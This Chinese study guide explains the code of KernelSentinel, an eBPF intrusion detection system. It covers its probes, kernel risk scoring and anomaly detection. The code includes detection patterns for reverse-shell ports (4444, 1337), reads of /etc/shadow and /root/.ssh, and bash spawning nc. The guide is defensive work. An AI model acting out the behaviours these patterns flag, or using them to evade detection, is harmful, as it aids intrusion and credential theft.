# 内核哨兵（KernelSentinel）完整项目逐文件详解

> 从零开始的全面学习指南。每章带你深入一个文件/一组文件，理解它们的代码逻辑与协作关系。
>
> ⚠️ **2026-08-31 修订说明**：本指南早期成稿（2026-07），此后进入 Phase E/F/G 大迭代——
> 探针从 9 个扩到 **16 个**（5 tracepoint + 11 kprobe）、eBPF 程序结构从多文件 `.bpf.c` 重构为
> **单入口 `ks_main.bpf.c` + 10 个 `ks_probes_*.h` 头文件**、新增 ml_detector/blocker/tier_detect/
> linux_map_reader 等模块、部分旧的逐行行号引用已失效（下文以"当前代码"说明为准，行号仅供回溯旧版本）。
> 权威现状请以 [ARCHITECTURE.md](ARCHITECTURE.md) 为准；本指南的讲解思路仍有效，但**任何数字都要对照 ARCHITECTURE.md 核对**。

---

# 第一部分：项目全景

## 1.1 目录结构

```
kernel-sentinel/
├── Cargo.toml                    # Rust 工作空间配置（4 个 crate 成员 + 本地 patch aya）
├── ARCHITECTURE.md               # 架构设计文档
├── README.md
├── docker-compose.yml            # Docker 编译环境
├── scripts/
│   ├── setup_dev.sh              # 开发环境一键搭建
│   ├── build.sh                  # 完整编译脚本
│   ├── build-musl.sh             # musl 静态单二进制构建
│   └── pack.sh                   # 交付包打包（tar.gz）
├── rules/                        # YAML 检测规则（9 套 23 条）
│   ├── reverse_shell.yml         # 反弹 Shell
│   ├── ransomware.yml            # 勒索软件
│   ├── privilege_escalation.yml  # 权限提升
│   ├── dns_tunnel.yml            # DNS 隧道
│   ├── rootkit_detect.yml        # Rootkit 检测
│   ├── data_exfil.yml            # 数据窃取
│   ├── container-escape.yml      # 容器逃逸 (event_type=80)
│   ├── lkm-load.yml              # LKM 加载 (event_type=81)
│   └── ebpf-tamper.yml           # eBPF 篡改 (event_type=82)
├── docs/                         # 设计文档
│   ├── study-guide.md            # 学习指南（就是本文件）
│   ├── ARCHITECTURE.md           # 架构设计（在仓库根，不是 docs/ 下）
│   ├── api-design.md             # API 设计
│   ├── security-design.md        # 安全设计
│   ├── teaching-guide.md         # 教学指南
│   └── ...
├── crates/
│   ├── ks-core/                  # 核心数据类型（事件/规则/告警）
│   │   ├── src/
│   │   │   ├── event.rs          # 事件结构体（C/Rust 对齐，8 种派生事件）
│   │   │   ├── rule.rs           # 规则定义（Field 枚举 25 变体）
│   │   │   └── alert.rs          # 告警结构（UUID + 状态机 + feedback）
│   │   └── Cargo.toml
│   ├── ks-ebpf/                  # eBPF 内核探针（纯 C，不在 workspace）
│   │   ├── src/bpf/
│   │   │   ├── common.h          # 公共头文件（结构体/宏/推理引擎/事件枚举）
│   │   │   ├── ks_main.bpf.c     # 唯一编译入口（按序 include 10 个探测头）
│   │   │   ├── ks_probes_syscall.h      # 系统调用探针
│   │   │   ├── ks_probes_vfs.h          # VFS 文件操作探针
│   │   │   ├── ks_probes_net.h          # 网络探针
│   │   │   ├── ks_probes_process_tree.h # 内核进程树追踪
│   │   │   ├── ks_probes_netflow.h      # 网络流状态机
│   │   │   ├── ks_probes_freq.h         # 频率计数器
│   │   │   ├── ks_probes_smart_filter.h # 智能过滤器
│   │   │   ├── ks_probes_lkm.h          # LKM 加载探针 (81)
│   │   │   ├── ks_probes_container.h    # 容器逃逸探针 (80)
│   │   │   └── ks_probes_self_protect.h # eBPF 自身防护 (82)
│   │   ├── scripts/ks_loader.c   # 3.10 无 BTF 内核的 C loader（--stream）
│   │   └── Cargo.toml
│   ├── ks-engine/                # 用户态引擎（Rust）
│   │   ├── src/
│   │   │   ├── lib.rs            # 模块声明
│   │   │   ├── config.rs         # 配置管理
│   │   │   ├── event_source.rs   # 事件源抽象 + tier 路由
│   │   │   ├── tier_detect.rs    # 内核版本/BTF 探测
│   │   │   ├── cloader_source.rs # C loader 子进程事件源
│   │   │   ├── aggregator.rs     # 事件聚合器（解码+环形缓冲+argv分段）
│   │   │   ├── loader.rs         # eBPF 加载器（16 探针 attach）
│   │   │   ├── linux_map_reader.rs # BPF map 真实读取（6 map）
│   │   │   ├── detector.rs       # 检测引擎（规则+异常评分）
│   │   │   ├── baseline.rs       # 基线偏离检测（z-score）
│   │   │   ├── ml_detector.rs    # EWMA 自适应检测
│   │   │   ├── correlation.rs    # 跨事件关联分析
│   │   │   ├── chain.rs          # 攻击链还原
│   │   │   ├── process_tree.rs   # 用户态进程树管理
│   │   │   ├── blocker.rs        # 用户态阻断表
│   │   │   └── forensic.rs       # 取证日志（哈希链防篡改）
│   │   ├── tests/                # integration_test.rs + e2e_attacks.rs
│   │   └── Cargo.toml
│   ├── ks-server/                # axum REST + WebSocket + 安全加固
│   └── ks-cli/                   # 命令行入口（8 子命令）
```

---

## 1.2 四层架构概述

项目分为四层，自下而上：

```
第四层: CLI + REST/WS API  (ks-cli / ks-server)     ← 命令行与 API 服务
                          ↓
第三层: 用户态引擎     (ks-engine/*.rs)          ← 事件处理/检测/取证
                          ↓
第二层: 内核推理层     (ks-ebpf/common.h 推理函数)  ← 内核态风险评分
                          ↓
第一层: 内核探针层     (ks-ebpf/ks_main.bpf.c)   ← 16 个探针程序捕获数据
```

第一、二层运行在 Linux **内核态**，用 C 写的 eBPF 程序。
第三层运行在 **用户态**，用 Rust 写的引擎代码。
第四层是用户交互界面。

**数据流从上到下是：** 探针捕获 → 内核推理 → ring buffer → 用户态解码 → 检测/关联/基线 → 取证日志 → 告警

---

## 1.3 四种运行模式

| 模式 | 事件来源 | 用途 |
|------|---------|------|
| **eBPF 模式 (modern)** | 内核 eBPF 探针 → aya ringbuf | 生产环境（5.8+ 内核） |
| **eBPF 模式 (legacy/ancient)** | 内核 eBPF 探针 → aya perfbuf | 4.x / 3.10 带 BTF 内核 |
| **CLoader 模式 (nobtf)** | ks_loader --stream 子进程 stdout 帧流 | 3.10/4.19 无 BTF 内核（tier_detect 自动路由） |
| **Mock 模式** | `MockEventSource` 生成模拟攻击事件 | 开发/测试/非 Linux 环境 |

> 早期说"当前环境（Windows）下运行 Mock 模式"已过时——当前开发机是 Linux（7.0 内核），
> 实际运行的是 eBPF 模式（16/16 探针 verifier 通过）；Mock 仅在非 Linux 平台或真机加载失败时
> 作为 last-resort fallback（start 日志有 warn）。重放模式通过 `kernelsentinel replay`（离线校验）与
> FileReplay 枚举（未实现）区分——目前回放走 replay 命令而非事件源。

---

## 1.4 完整数据流图

以下是从事件产生到告警的完整路径，包含了每个步骤涉及的文件：

```
步骤 1: 事件捕获
┌─────────────────────────────────────────────────────┐
│ eBPF 探针层 (ks-ebpf/src/bpf/*.bpf.c)               │
│   syscall_probe: sys_enter→保存上下文, sys_exit→解码 │
│   vfs_probe:     vfs_open/vfs_write/vfs_unlink       │
│   net_probe:     tcp_v4_connect/udp_sendmsg          │
│   process_tree:  sched_process_fork/exec/exit        │
│   net_flow:      TCP 流状态追踪 + C2/端口扫描检测    │
│   freq_counter:  各维度操作频率计数 + 勒索/隧道/爆破 │
│         ↓                                           │
│   推理引擎 infer.bpf.c ← 每步调用 4 维推理打分      │
│         ↓                                           │
│   智能过滤器 smart_filter.bpf.c ← 低风险阻断         │
│         ↓                                           │
│   写入 ring buffer                                  │
└─────────────────────────────────────────────────────┘
         ↓ 裸字节
步骤 2: 事件传输
┌─────────────────────────────────────────────────────┐
│ BPF ring buffer (events 16MB, 其余各 1MB)                │
│ 内核态 → 用户态 (共享内存, 无需复制)                 │
└─────────────────────────────────────────────────────┘
         ↓ 裸字节
步骤 3: 事件解码
┌─────────────────────────────────────────────────────┐
│ aggregator.rs: decode()                              │
│   1. RawEvent::from_bytes 两阶段越界校验             │
│   2. 按 event_type 分发: ExecEvent/FileEvent/...     │
│   3. cstr→String 解码                                │
│   4. IPv4/IPv6 地址转字符串                           │
│   5. 推入 VecDeque 环形缓冲                           │
│   6. seq 自增 (事件序列号)                            │
└─────────────────────────────────────────────────────┘
         ↓ DecodedEvent
步骤 4a: 取证日志         步骤 4b: 规则匹配      步骤 4c: 异常评分
┌──────────────────┐    ┌──────────────────┐    ┌──────────────────┐
│ forensic.rs      │    │ detector.rs      │    │ detector.rs      │
│ log_event()      │    │ match_event()    │    │ anomaly_score()  │
│ SHA-256 哈希链    │    │ 遍历所有规则      │    │ 6 维加权评分     │
│ JSONL 写入       │    │ AND 条件匹配      │    │ 文件/网络/命令   │
│ 自动轮转+压缩    │    │ 命中→MatchResult  │    │ 分数 0-1         │
└──────────────────┘    └──────────────────┘    └──────────────────┘
         ↓                    ↓                       ↓
步骤 5: 告警生成 → 关联分析 → 攻击链还原 → 进程树分析
         ↓                    ↓                       ↓
┌──────────────────────────────────────────────────────────────┐
│ detector.generate_alert() → Alert                            │
│ correlation.detect_correlations() → CorrelationAlert          │
│ chain.reconstruct() → AttackChain（置信度 + 攻击阶段）        │
│ process_tree.reconstruct_tree_attack_chain()                  │
│ baseline.detect_deviation() → DeviationResult（z-score偏离） │
└──────────────────────────────────────────────────────────────┘
         ↓
步骤 6: 输出
   告警列表 → 日志文件 → WebSocket 推送（待前端）
```

---

# 第二部分：逐文件详解

## 第 A 组：eBPF 内核探针层（ks-ebpf/src/bpf/）

### 文件 A1: `common.h` — 公共头文件

**路径：** `crates/ks-ebpf/src/bpf/common.h`

**作用：** 所有 eBPF C 程序的公共头文件，定义事件结构体、事件类型常量、辅助函数。

#### 关键内容详解

**第一部分：事件类型枚举（common.h 第 147-167 行及各区段）**

```c
#define EVENT_PROCESS_EXEC  1         // 进程执行（sys_exit 59）
#define EVENT_PROCESS_EXIT  2         // 定义有，无探针发射（退出走树事件 42）
#define EVENT_PROCESS_CLONE 3         // 定义有，无探针发射（fork 走树事件 40）
#define EVENT_FILE_OPEN     10        // 打开（sys_exit 2/257）
#define EVENT_FILE_READ     11        // 定义有，无探针发射
#define EVENT_FILE_WRITE    12        // kprobe/vfs_write（≥1024B）
#define EVENT_FILE_DELETE   13        // kprobe/vfs_unlink
#define EVENT_FILE_RENAME   14        // 定义有，无探针发射
#define EVENT_FILE_CHMOD    15        // 定义有，无探针发射
#define EVENT_NET_CONNECT   20        // sys_exit 42 + tcp_v4/v6_connect（双通道）
#define EVENT_NET_ACCEPT    21        // 定义有，无探针发射
#define EVENT_NET_SEND      22        // kprobe/udp_sendmsg（dport≠53）
#define EVENT_NET_RECV      23        // 定义有，无探针发射
#define EVENT_NET_DNS       24        // kprobe/udp_sendmsg（dport==53）
#define EVENT_PROC_PTRACE   30        // sys_exit 101
#define EVENT_PROC_SIGNAL   31        // sys_exit 62
// 进程树 40-43（fork/exec/exit/anomaly，ks_probes_process_tree.h）
// 网络流 50-54（状态机，ks_probes_netflow.h）；频率 60-61（ks_probes_freq.h）
// 过滤 70-72（仅常量，不发射）
#define EVENT_CONTAINER_ESCAPE 80     // kprobe/commit_creds
#define EVENT_LKM_LOAD         81     // kprobe/do_init_module + sys_exit 313（双发射）
#define EVENT_EBPF_TAMPER      82     // kprobe/security_bpf_prog_free
```

每个#define 定义一个事件类型编号。这些编号贯穿整个系统：
- eBPF 探针捕获事件时，给 `header.event_type` 赋这个值
- Rust 端 `aggregator.rs` 解码时，根据这个值判断如何解析后续字节
- Rust 端 `detector.rs` 规则匹配时，可以匹配这个值

编号段含义：进程 1-3、文件 10-15、网络 20-24、信号 30-31、树 40-43、流 50-54、频率 60-61、过滤 70-72、安全扩展 80-82。⚠️ 其中 2/3/11/14/15/21/23 及 43/52/53/54/70-72 是"定义存在但无探针发射"的预留段，Rust 端 min_event_size 需容忍。

**第二部分：事件结构体定义（第 27-72 行）**

`struct event_header`（第 27-39 行）是所有事件的头部，固定 64 字节：

```c
struct event_header {
    u32 event_type;       // 事件类型（1=进程执行, 10=打开文件...）
    u32 _pad1;            // 填充字节，保证对齐
    u64 timestamp_ns;     // 时间戳（纳秒）
    u32 pid;              // 进程 ID
    u32 tid;              // 线程 ID
    u32 uid;              // 用户 ID（0=root）
    u32 ppid;             // 父进程 ID
    u8  comm[16];         // 进程名（最多 16 字节）
    i32 syscall_nr;       // 系统调用编号（59=execve, 42=connect...）
    u32 _pad2;            // 填充字节
    i64 retval;           // 返回值（>=0=成功, <0=错误码）
};
```

为什么要有 `_pad1`、`_pad2`？为了让结构体的大小是 8 的倍数。CPU 读取对齐的数据更快。

然后定义了 8 种事件类型（EventHeader 64 字节 + 派生），分别对应不同大小的数据结构：

| 结构体 | 事件类型 | 大小 | 包含什么 |
|--------|---------|------|---------|
| `exec_event` | 1 | 832 字节 | header + filename[256] + args[512]（args 语义为 5×64B 定长槽位） |
| `file_event` | 10-15 | 336 字节 | header + filename[256] + bytes + fd + flags |
| `net_event` | 20-24 | 112 字节 | header + saddr + daddr + sport + dport + proto + family + saddr6 + daddr6 |
| `signal_event` | 30-31 | 72 字节 | header + target_pid + signal |
| `container_escape_event` | 80 | 104 字节 | header + pid/uid + source_ns_inum + target_ns_inum + cap_eff + comm |
| `lkm_load_event` | 81 | 160 字节 | header + pid/uid + module_name[64] + comm[16] |
| `ebpf_tamper_event` | 82 | 176 字节 | header + pid/uid + prog_name[64] + comm[16] + action[16] |
| `process_tree_event` / `net_flow_event` / 频率事件 | 40-43 / 50-54 / 60-61 | 见各区段头文件 | 树/流/频率专用通道（独立 ringbuf） |

Rust 侧编译期断言：`size_of::<EventHeader>() == 64`、ExecEvent 832、FileEvent 336、NetEvent 112、SignalEvent 72（`#[repr(C)]`）。

**第三部分：辅助函数（第 74-98 行）**

`fill_header`（第 74-90 行）：填充事件头部的通用字段。
```c
static __always_inline void fill_header(struct event_header *hdr, u32 event_type) {
    u64 pid_tgid = bpf_get_current_pid_tgid();  // 获取当前进程 PID+TID
    u64 uid_gid  = bpf_get_current_uid_gid();   // 获取当前用户 UID+GID
    
    hdr->event_type   = event_type;
    hdr->timestamp_ns = bpf_ktime_get_ns();     // 纳秒级时间戳
    hdr->pid          = pid_tgid >> 32;          // 高 32 位是 PID
    hdr->tid          = (u32)pid_tgid;           // 低 32 位是 TID
    hdr->uid          = (u32)uid_gid;            // 用户 ID
    hdr->ppid         = 0;                       // 父进程 ID（需要额外获取）
    hdr->syscall_nr   = 0;                       // 系统调用号（需要额外设置）
    ...
    bpf_get_current_comm(&hdr->comm, sizeof(hdr->comm)); // 获取进程名
}
```

`__always_inline` 是 eBPF 的关键——eBPF 程序不允许函数调用（会把所有函数内联展开），也不允许循环（会被验证器拒绝）。

---

### 文件 A2: `ks_probes_syscall.h` — 系统调用探针

**路径：** `crates/ks-ebpf/src/bpf/ks_probes_syscall.h`（早期版本是独立 `syscall_probe.bpf.c`，已重构入单编译单元）

**作用：** 在系统调用的入口和出口挂探针，捕获 9 种关键系统调用的执行。

#### 它挂在哪里？

两个 tracepoint：
- `tracepoint/raw_syscalls/sys_enter` — 系统调用进入时触发
- `tracepoint/raw_syscalls/sys_exit` — 系统调用返回时触发

另有一个精简的 sched tracepoint（进程树在 `ks_probes_process_tree.h` 里分三个）：
- `sched/sched_process_exec` / `sched_process_exit` — 在树模块中

#### 工作流程

```
步骤 1: sys_enter 触发（每次系统调用都触发）
  ↓
  switch(syscall_nr) {
      59(execve) | 2(open) | 257(openat) | 0(read) | 1(write) | 42(connect) | 101(ptrace) | 62(kill):
          保存上下文到 syscall_ctxs map
      default:
          直接返回（不关心的 syscall 不做任何操作）
  }

步骤 2: sys_exit 触发（对应的系统调用返回时触发）
  ↓
  从 syscall_ctxs map 找回之前保存的上下文
  ↓
  根据 syscall_nr 走不同分支:
      execve(59)    → 构造 exec_event，从用户态读 filename 和 args
      open(2)/openat(257) → 构造 file_event
      connect(42)   → 构造 net_event，从 sockaddr 读目标 IP/端口
      ptrace(101)   → 构造 signal_event
      kill(62)      → 构造 signal_event
  ↓
  每步都调用 infer_event()（内核推理打分）
  ↓
  写入 ring buffer → 用户态
```

关键代码详解：

**sys_enter 过滤（第 38-45 行）：**
```c
switch (syscall_nr) {
case 59: case 2: case 257: case 0: case 1: case 42: case 101: case 62: case 313:
    break;     // 只关心这 9 个 syscall
default:
    return 0;  // 其他 syscall 直接忽略
}
```
这 9 个系统调用是经过设计的：
- 59 (execve) → 进程执行
- 2/257 (open/openat) → 文件打开
- 0 (read) → 文件读取
- 1 (write) → 文件写入
- 42 (connect) → 网络连接
- 101 (ptrace) → 进程注入
- 62 (kill) → 信号发送
- 313 (finit_module) → 内核模块加载（8-30 新增，失败时发 LKM 事件）

**execve 解码（第 61-97 行）：**

这是最复杂的一个分支。当发生 execve（执行新程序）时：

```c
if (syscall_nr == 59 && ret >= 0) {           // execve 执行成功
    struct exec_event *evt = bpf_ringbuf_reserve(&events, sizeof(struct exec_event), 0);
    fill_header(&evt->header, EVENT_PROCESS_EXEC);
    
    // 从用户态地址空间读 filename（第一个参数）
    const char __user *filename_ptr = (const char __user *)sctx->args[0];
    bpf_probe_read_user_str(evt->filename, sizeof(evt->filename), filename_ptr);
    
    // 从用户态地址空间读 argv（第二个参数），拼接成字符串
    const char __user *const *argv_ptr = (const char __user *const *)sctx->args[1];
    for (int i = 0; i < 5 && offset < sizeof(evt->args) - 1; i++) {
        // 逐参数读，用空格拼接
        bpf_probe_read_user_str(evt->args + offset, ..., arg_ptr);
        evt->args[offset] = ' ';  // 参数之间加空格
    }
    
    infer_event(..., EVENT_PROCESS_EXEC, ...);  // 内核推理打分
    bpf_ringbuf_submit(evt, 0);                 // 发送到 ring buffer
}
```

注意：`bpf_probe_read_user_str` 是从用户态内存读取字符串。因为 eBPF 在内核态运行，不能直接解引用用户态指针。

**connect 解码（第 123-165 行）：**

当进程连接网络时，从 sockaddr 结构读取目标 IP 和端口：

```c
if (syscall_nr == 42) {
    // 读取 sockaddr 结构
    struct sockaddr __user *addr = (struct sockaddr __user *)sctx->args[1];
    struct sockaddr sa;
    bpf_probe_read_user(&sa, sizeof(sa), addr);
    
    if (sa.sa_family == 2) {           // AF_INET (IPv4)
        struct sockaddr_in sin;
        bpf_probe_read_user(&sin, sizeof(sin), addr);
        evt->daddr = sin.sin_addr.s_addr;  // 目标 IP
        evt->dport = bpf_ntohs(sin.sin_port);  // 目标端口（网络字节序转主机字节序）
        evt->proto = 6;  // TCP
    } else if (sa.sa_family == 10) {   // AF_INET6 (IPv6)
        struct sockaddr_in6 sin6;
        // 类似处理，但目标地址是 16 字节
    }
}
```

`bpf_ntohs` 把网络字节序（大端）转为主机字节序（小端）。网络上传输的数据统一用大端，而 x86 CPU 用小端。

**sched_process_exit（第 217-230 行）：**

只用 header，不需要额外数据。发送一个事件类型为 `EVENT_PROCESS_EXIT`（=2）的简单事件，告诉用户态这个进程退出了。

---

### 文件 A3: `vfs_probe.bpf.c` — VFS 文件操作探针

**路径：** `crates/ks-ebpf/src/bpf/vfs_probe.bpf.c`

**作用：** 在 VFS（虚拟文件系统）层挂 kprobe，捕获文件打开、写入、删除操作。

#### 为什么需要 VFS 探针？（重要设计决策）

系统调用层（syscall_probe）已经能捕获 `open`、`write` 等系统调用，为什么还要在 VFS 层再挂探针？

因为**syscall 层看到的是用户态路径，而 VFS 层能捕获内核态的文件操作**。有些恶意程序通过内核态接口操作文件，绕过了 syscall 层监控。VFS 探针补上了这个盲区。

另外，`vfs_write` 探针只捕获写入量 > 1KB 的事件（第 42 行 `if (count < 1024) return 0;`），过滤掉了小写入，减少性能开销。

#### 关键代码

**vfs_open（第 25-38 行）：**

```c
SEC("kprobe/vfs_open")
int BPF_KPROBE(kprobe_vfs_open, struct path *path, struct file *file) {
    struct file_event *evt = bpf_ringbuf_reserve(&events, sizeof(struct file_event), 0);
    fill_header(&evt->header, EVENT_FILE_OPEN);
    
    // 读取完整文件路径
    read_full_path(path, evt->filename, sizeof(evt->filename));
    
    // 这里只调 infer_sensitive_file（判断是否访问敏感文件）
    // 不调 infer_event 的 switch，因为这个探针只关心文件
    infer_sensitive_file((const char *)evt->filename, evt->header.pid);
    
    bpf_ringbuf_submit(evt, 0);
}
```

`read_full_path` 函数（第 9-18 行）尝试用 `bpf_d_path` 获取完整路径，如果失败就退回到读取 dentry 名称。`bpf_d_path` 是 eBPF 提供的辅助函数，能从文件路径结构体（`struct path`）中解析出完整的文件路径字符串。

**vfs_write（第 40-55 行）：**

```c
SEC("kprobe/vfs_write")
int BPF_KPROBE(kprobe_vfs_write, struct file *file, const char *buf, size_t count, loff_t *pos) {
    if (count < 1024) return 0;  // 小于 1KB 的写入不关注
    
    struct file_event *evt = bpf_ringbuf_reserve(&events, sizeof(struct file_event), 0);
    fill_header(&evt->header, EVENT_FILE_WRITE);
    read_file_path(file, evt->filename, sizeof(evt->filename));
    evt->bytes = count;  // 记录写入字节数
    
    infer_bulk_file_ops(..., EVENT_FILE_WRITE, ...);  // 批量文件操作计数
    
    bpf_ringbuf_submit(evt, 0);
}
```

**vfs_unlink（第 57-72 行）：**

捕获文件删除操作（`unlink` 系统调用在 VFS 层的对应）。

---

### 文件 A4: `net_probe.bpf.c` — 网络探针

**路径：** `crates/ks-ebpf/src/bpf/net_probe.bpf.c`

**作用：** 在 TCP 连接和 UDP 发送时挂 kprobe，捕获网络活动。补上了 syscall 层 connect 看不到的 IP 和端口细节（syscall 层的 connect 探针也做了类似的事，但 net_probe 从内核 socket 结构直接读取数据，更可靠）。

**三个挂载点：**

| 挂载点 | 捕获什么 | eBPF 函数名 |
|--------|---------|-------------|
| `kprobe/tcp_v4_connect` | TCP IPv4 出站连接 | `kprobe_tcp_connect` |
| `kprobe/tcp_v6_connect` | TCP IPv6 出站连接 | `kprobe_tcp_v6_connect` |
| `kprobe/udp_sendmsg` | UDP 数据发送 | `kprobe_udp_sendmsg` |

**udp_sendmsg 中的 DNS 检测（第 95-96 行）：**

```c
if (evt->dport == 53)
    evt->header.event_type = EVENT_NET_DNS;  // 标记为 DNS 事件
```

当 UDP 数据发送到端口 53 时，事件类型被标记为 `EVENT_NET_DNS`（=24）。这样用户态可以区分普通 UDP 和 DNS 查询。

---

### 文件 A5: `infer.bpf.c` — 内核推理引擎

**路径：** `crates/ks-ebpf/src/bpf/infer.bpf.c`

**作用：** 这是项目的"内核态大脑"。它给每个进程累加风险分（0-100），分数够了就告警。所有探针（syscall/vfs/net）在捕获事件后都会调用它。

#### 核心数据结构

**`risk_scores` map（第 11-16 行）：**
```c
struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);  // LRU = 最近最少使用淘汰
    __type(key, u32);                      // key = PID
    __type(value, u32);                    // value = 风险分 (0-100)
    __uint(max_entries, 4096);             // 最多跟踪 4096 个进程
} risk_scores SEC(".maps");
```

这是一个 LRU（Least Recently Used）哈希表。key 是进程的 PID，value 是风险分。当跟踪的进程数量超过 4096 时，最早不活跃的进程会被自动淘汰。

#### 四个推理维度

**1. `infer_sensitive_file`（第 68-82 行）**

检测进程访问敏感文件：

```c
int infer_sensitive_file(const char *filename, u32 pid) {
    // 检测 "/etc/s" 开头 → /etc/shadow
    if (filename[0]=='/' && filename[1]=='e' && ...) {
        add_risk(pid, 40);  // 风险分 +40
        return 1;
    }
    // 检测 "/root" 开头 → /root/.ssh 等
    if (filename[0]=='/' && filename[1]=='r' && ...) {
        add_risk(pid, 30);
        return 1;
    }
    // 检测 "/proc" 开头
    if (filename[0]=='/' && filename[1]=='p' && ...) {
        add_risk(pid, 15);
        return 0;
    }
    return 0;
}
```

注意：eBPF 中**不能使用标准库函数**（没有 `strcmp`、没有 `strstr`），所以只能逐字符比较。这是 eBPF 编程的限制。

**2. `infer_suspicious_net`（第 84-108 行）**

检测可疑网络连接，包含三个检测维度：

```c
int infer_suspicious_net(u32 pid, u32 daddr, u16 dport, u8 proto) {
    // 维度 1: IP 白名单检查
    u8 *whitelisted = bpf_map_lookup_elem(&ip_whitelist, &daddr);
    if (whitelisted && *whitelisted == 1) return 0;  // 白名单 IP 直接跳过
    
    // 维度 2: 恶意端口检查
    if (dport == 4444 || dport == 1337 || ...) {
        add_risk(pid, 50);  // 风险分 +50（极高）
    }
    
    // 维度 3: 高位非标端口
    if (dport > 1024 && dport != 8080 && ...) {
        add_risk(pid, 10);  // 不是常见端口就加分
    }
    
    // 维度 4: C2 心跳检测（短时间重复连同一 IP:PORT）
    struct net_conn_key key = {.pid=pid, .daddr=daddr, .dport=dport, .proto=proto};
    u64 *prev = bpf_map_lookup_elem(&net_conn_history, &key);
    if (prev && now - *prev < 60_000_000_000)  // 60 秒内重复连接
        add_risk(pid, 5);  // 标记 C2 心跳
    bpf_map_update_elem(&net_conn_history, &key, &now, BPF_ANY);
}
```

C2 心跳检测的逻辑：如果同一个进程在 60 秒内再次连接同一个 IP:PORT，就认为可能是 C2 心跳。正常程序不会频繁断开重连同一个地址。

**3. `infer_bulk_file_ops`（第 110-114 行）**

```c
static __always_inline void infer_bulk_file_ops(u32 pid, u32 event_type, u64 timestamp) {
    if (event_type != EVENT_FILE_WRITE && event_type != EVENT_FILE_DELETE
        && event_type != EVENT_FILE_RENAME) return;
    add_risk(pid, 2);  // 每次写/删/改名 +2 分
}
```

每次文件写入/删除/重命名加 2 分。勒索软件会在短时间内操作大量文件，分数会快速累积到阈值。

**4. `infer_process_injection`（第 116-124 行）**

```c
int infer_process_injection(u32 pid, u32 target_pid, u32 event_type) {
    if (event_type == EVENT_PROC_PTRACE) {
        add_risk(pid, 35);  // ptrace → +35
    }
    if (event_type == EVENT_PROC_SIGNAL) {
        add_risk(pid, 20);  // kill → +20
    }
}
```

`ptrace`（Linux 调试系统调用）是进程注入的常用手段。恶意程序用 ptrace 附加到目标进程，修改其内存，执行恶意代码。`kill` 信号可能用于杀掉安全进程。

#### 主调度函数 `infer_event`（第 127-158 行）

```c
int infer_event(u32 pid, u32 event_type, const char *filename,
                u32 daddr, u16 dport, u8 proto, u32 target_pid) {
    u32 threshold = get_config(CFG_RISK_THRESHOLD, 70);  // 默认阈值 70
    
    switch (event_type) {
    case EVENT_FILE_OPEN:
    case EVENT_FILE_READ:
        alert = infer_sensitive_file(filename, pid);
        break;
    case EVENT_FILE_WRITE:
    case EVENT_FILE_DELETE:
        infer_bulk_file_ops(pid, event_type, ...);
        alert = infer_sensitive_file(filename, pid);
        break;
    case EVENT_NET_CONNECT:
    case EVENT_NET_SEND:
        alert = infer_suspicious_net(pid, daddr, dport, proto);
        break;
    case EVENT_PROC_PTRACE:
    case EVENT_PROC_SIGNAL:
        alert = infer_process_injection(pid, target_pid, event_type);
        break;
    }
    
    risk = get_risk(pid);                // 读取当前总分
    if (risk >= threshold) return 2;     // 高风险 → 需要告警
    if (alert) return 1;                 // 单次高风险 → 需要上报
    return 0;                            // 低风险 → 只更新 map
}
```

返回值含义：
- `0`：低风险，数据不需要发到用户态（只更新 map）
- `1`：单次事件异常，需要上报到用户态
- `2`：累计风险分 ≥ 阈值，严重告警

---

### 文件 A6: `process_tree.bpf.c` — 内核进程树追踪

**路径：** `crates/ks-ebpf/src/bpf/process_tree.bpf.c`

**作用：** 在内核态直接维护进程父子关系拓扑，检测异常父子关系（如 bash→nc）。

#### 它和 Rust 端 process_tree.rs 的关系

这里有个**两级设计**：
- **内核态**（`process_tree.bpf.c`）：实时维护进程拓扑，发现异常父子关系时立即发事件
- **用户态**（`process_tree.rs`）：从事件重建进程树，做更复杂的分析（BFS 家族遍历、攻击链升级）

内核态快但简单（只能做精确匹配），用户态慢但灵活（可以做任意分析）。

#### 内核态如何检测异常父子关系？

```c
// 定义已知的恶意父子对
struct anomaly_relation_key {
    u8 parent_comm[16], child_comm[16];
};

// 这个 map 由用户态加载规则时填充
// 比如: key={"bash","nc"}, value=1
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, struct anomaly_relation_key);
    __uint(max_entries, 64);
} anomaly_relations SEC(".maps");
```

当 `sched_process_fork` 触发时，新进程的父进程名和子进程名会在 `anomaly_relations` map 中查找。如果找到匹配，子进程被标记为 `PROC_FLAG_ANOMALOUS`（异常）。

---

### 文件 A7: `net_flow.bpf.c` — 网络流状态机

**路径：** `crates/ks-ebpf/src/bpf/net_flow.bpf.c`

**作用：** 追踪每个 TCP 连接的完整生命周期，检测 C2 心跳、数据外泄、端口扫描。

#### TCP 流状态机

```
TCP 流状态:
  SYN_SENT (1) → ESTABLISHED (2) → FIN_WAIT (3) → CLOSED (4)
                                                        ↑
                                                     RESET (5)
```

每个 TCP 流用 `struct net_flow_key` 唯一标识（五元组：PID、源 IP、目标 IP、源端口、目标端口、协议）。

#### 检测的异常类型（第 29-33 行）

```c
#define FLOW_ANOMALY_C2_HEARTBEAT   (1 << 0)  // 位 0: C2 心跳
#define FLOW_ANOMALY_DATA_EXFIL     (1 << 1)  // 位 1: 数据外泄
#define FLOW_ANOMALY_PORT_SCAN      (1 << 2)  // 位 2: 端口扫描
#define FLOW_ANOMALY_LONG_CONN      (1 << 3)  // 位 3: 超长连接
#define FLOW_ANOMALY_FAST_RECONNECT (1 << 4)  // 位 4: 快速重连
```

使用位运算（`|=`），一个 `anomaly_flags` 字段可以同时标记多种异常。

#### C2 心跳检测（第 91-98 行）

```c
struct net_flow_state *prev = bpf_map_lookup_elem(&net_flows, &key);
if (prev) {
    u64 time_since_last = now - prev->last_update_ns;
    if (time_since_last < 30ULL * 1000 * 1000 * 1000)  // 30 秒内重连
        state.anomaly_flags |= FLOW_ANOMALY_FAST_RECONNECT;
    if (prev->connect_count >= 3)   // 第三次以上重连
        state.anomaly_flags |= FLOW_ANOMALY_C2_HEARTBEAT;
    state.connect_count = prev->connect_count + 1;
}
```

恶意软件的 C2（命令与控制）通信通常有"心跳"特征——每隔一段时间连一次服务器，检查是否有新指令。正常程序不会频繁断开重连同一个地址。

#### 端口扫描检测（第 101-110 行）

```c
struct port_scan_tracker *scan = bpf_map_lookup_elem(&port_scan_map, &pid);
if (scan) {
    scan->scan_count++;
    if (scan->scan_count >= 20 && scan_duration < 30_000_000_000)  // 30 秒内连 20 次以上
        state.anomaly_flags |= FLOW_ANOMALY_PORT_SCAN;
